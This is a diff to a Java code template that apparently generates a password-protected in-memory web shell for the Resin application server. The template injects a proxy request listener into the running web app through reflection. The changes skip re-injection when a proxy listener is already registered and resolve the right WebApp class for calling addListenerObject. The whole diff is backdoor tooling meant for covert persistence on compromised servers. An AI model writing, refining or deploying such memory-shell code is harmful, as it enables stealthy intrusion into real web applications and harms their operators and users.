@@ -4,7 +4,6 @@ import java.util.*;
 
 public class ResinListener implements InvocationHandler {{
     private static String password = "{password}";
-    private static boolean initialized = false;
 {common}
 {context}
 {decoder}
@@ -32,8 +31,19 @@ public class ResinListener implements InvocationHandler {{
 
     private void addListener(Object proxyObject) throws Exception {{
         Object webApp = getWebApp();
+        ArrayList<?> listeners =
+            (ArrayList<?>) getFieldValue(webApp, "_requestListeners");
+        for (Object listener: listeners) {{
+            if (listener instanceof Proxy) {{
+                return;
+            }}
+        }}
+        Class WebApp = webApp.getClass();
+        if (WebApp.getName() == "com.caucho.server.webapp.Application") {{
+            WebApp = WebApp.getSuperclass();
+        }}
         Method addListenerObject = getMethodX(
-            webApp.getClass(), "addListenerObject", 2
+            WebApp, "addListenerObject", 2
         );
         addListenerObject.setAccessible(true);
         addListenerObject.invoke(webApp, proxyObject, true);
@@ -41,10 +51,6 @@ public class ResinListener implements InvocationHandler {{
 
     public ResinListener() {{
         synchronized(lock) {{
-            if (initialized != false) {{
-                return;
-            }}
-
             Class servletRequestListener = null;
             try {{
                 servletRequestListener = Class.forName(
@@ -58,7 +64,6 @@ public class ResinListener implements InvocationHandler {{
                 );
                 try {{
                     addListener(proxyObject);
-                    initialized = true;
                 }} catch (Exception e) {{}}
             }}
         }}
